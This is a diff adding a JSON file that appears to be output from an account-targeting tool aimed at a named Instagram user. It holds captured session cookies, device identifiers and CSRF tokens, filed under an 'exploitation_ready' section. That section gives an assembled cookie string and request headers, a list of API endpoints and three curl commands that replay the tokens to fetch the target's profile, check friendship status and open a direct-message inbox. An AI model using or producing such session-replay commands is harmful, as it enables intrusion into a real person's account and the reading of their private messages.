@@ -1,0 +1,70 @@
+{
+  "target": "whatilove1728",
+  "timestamp": "2025-05-26T05:04:13.694245",
+  "session_identifiers": {
+    "web_session_id": "0sp86g:wi5x4w:ztf6hg",
+    "ig_did": "97F4190C-4245-4FE0-9177-EF12C8F1C499",
+    "mid": "aDP01gALAAFnctgo2lEOC231MZzw"
+  },
+  "authentication_tokens": {
+    "user_id": "0"
+  },
+  "device_identifiers": {
+    "instagram_device_id": "97F4190C-4245-4FE0-9177-EF12C8F1C499",
+    "machine_id": "aDP01gALAAFnctgo2lEOC231MZzw"
+  },
+  "csrf_tokens": {
+    "cookie_csrf": "g2FKyS1r5qhY1Qb0-Oggng",
+    "token_csrf": "g2FKyS1r5qhY1Qb0-Oggng",
+    "header_csrf": "g2FKyS1r5qhY1Qb0-Oggng"
+  },
+  "app_data": {
+    "app_id": "936619743392459",
+    "header_app_id": "936619743392459"
+  },
+  "exploitation_ready": {
+    "cookie_string": "ig_did=97F4190C-4245-4FE0-9177-EF12C8F1C499; mid=aDP01gALAAFnctgo2lEOC231MZzw; csrftoken=g2FKyS1r5qhY1Qb0-Oggng",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "Accept": "application/json, text/plain, */*",
+      "Accept-Language": "en-US,en;q=0.9",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Cookie": "ig_did=97F4190C-4245-4FE0-9177-EF12C8F1C499; mid=aDP01gALAAFnctgo2lEOC231MZzw; csrftoken=g2FKyS1r5qhY1Qb0-Oggng",
+      "Referer": "https://www.instagram.com/whatilove1728/",
+      "Origin": "https://www.instagram.com",
+      "X-CSRFToken": "g2FKyS1r5qhY1Qb0-Oggng",
+      "X-Instagram-AJAX": "1",
+      "X-Requested-With": "XMLHttpRequest",
+      "X-IG-App-ID": "936619743392459",
+      "X-Web-Session-ID": "0sp86g:wi5x4w:ztf6hg"
+    },
+    "api_endpoints": [
+      "https://www.instagram.com/api/v1/users/web_profile_info/",
+      "https://www.instagram.com/api/v1/friendships/show/",
+      "https://www.instagram.com/graphql/query/",
+      "https://i.instagram.com/api/v1/users/search/",
+      "https://www.instagram.com/api/v1/direct_v2/inbox/",
+      "https://www.instagram.com/api/v1/media/configure/",
+      "https://www.instagram.com/api/v1/accounts/edit/"
+    ],
+    "target_specific_endpoints": [
+      "https://www.instagram.com/api/v1/users/whatilove1728/info/",
+      "https://www.instagram.com/api/v1/friendships/show/whatilove1728/",
+      "https://www.instagram.com/whatilove1728/?__a=1&__d=dis"
+    ],
+    "curl_commands": [
+      {
+        "description": "Get target profile info",
+        "command": "curl -X GET \\\n  'https://www.instagram.com/api/v1/users/web_profile_info/?username=whatilove1728' \\\n  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' \\\n  -H 'X-CSRFToken: g2FKyS1r5qhY1Qb0-Oggng' \\\n  -H 'X-IG-App-ID: 936619743392459' \\\n  -H 'Cookie: ig_did=97F4190C-4245-4FE0-9177-EF12C8F1C499; mid=aDP01gALAAFnctgo2lEOC231MZzw; csrftoken=g2FKyS1r5qhY1Qb0-Oggng' \\\n  --compressed"
+      },
+      {
+        "description": "Check friendship status",
+        "command": "curl -X GET \\\n  'https://www.instagram.com/api/v1/friendships/show/whatilove1728/' \\\n  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' \\\n  -H 'X-CSRFToken: g2FKyS1r5qhY1Qb0-Oggng' \\\n  -H 'Cookie: ig_did=97F4190C-4245-4FE0-9177-EF12C8F1C499; mid=aDP01gALAAFnctgo2lEOC231MZzw; csrftoken=g2FKyS1r5qhY1Qb0-Oggng' \\\n  --compressed"
+      },
+      {
+        "description": "Access DM inbox",
+        "command": "curl -X GET \\\n  'https://www.instagram.com/api/v1/direct_v2/inbox/' \\\n  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' \\\n  -H 'X-CSRFToken: g2FKyS1r5qhY1Qb0-Oggng' \\\n  -H 'Cookie: ig_did=97F4190C-4245-4FE0-9177-EF12C8F1C499; mid=aDP01gALAAFnctgo2lEOC231MZzw; csrftoken=g2FKyS1r5qhY1Qb0-Oggng' \\\n  --compressed"
+      }
+    ]
+  }
+}
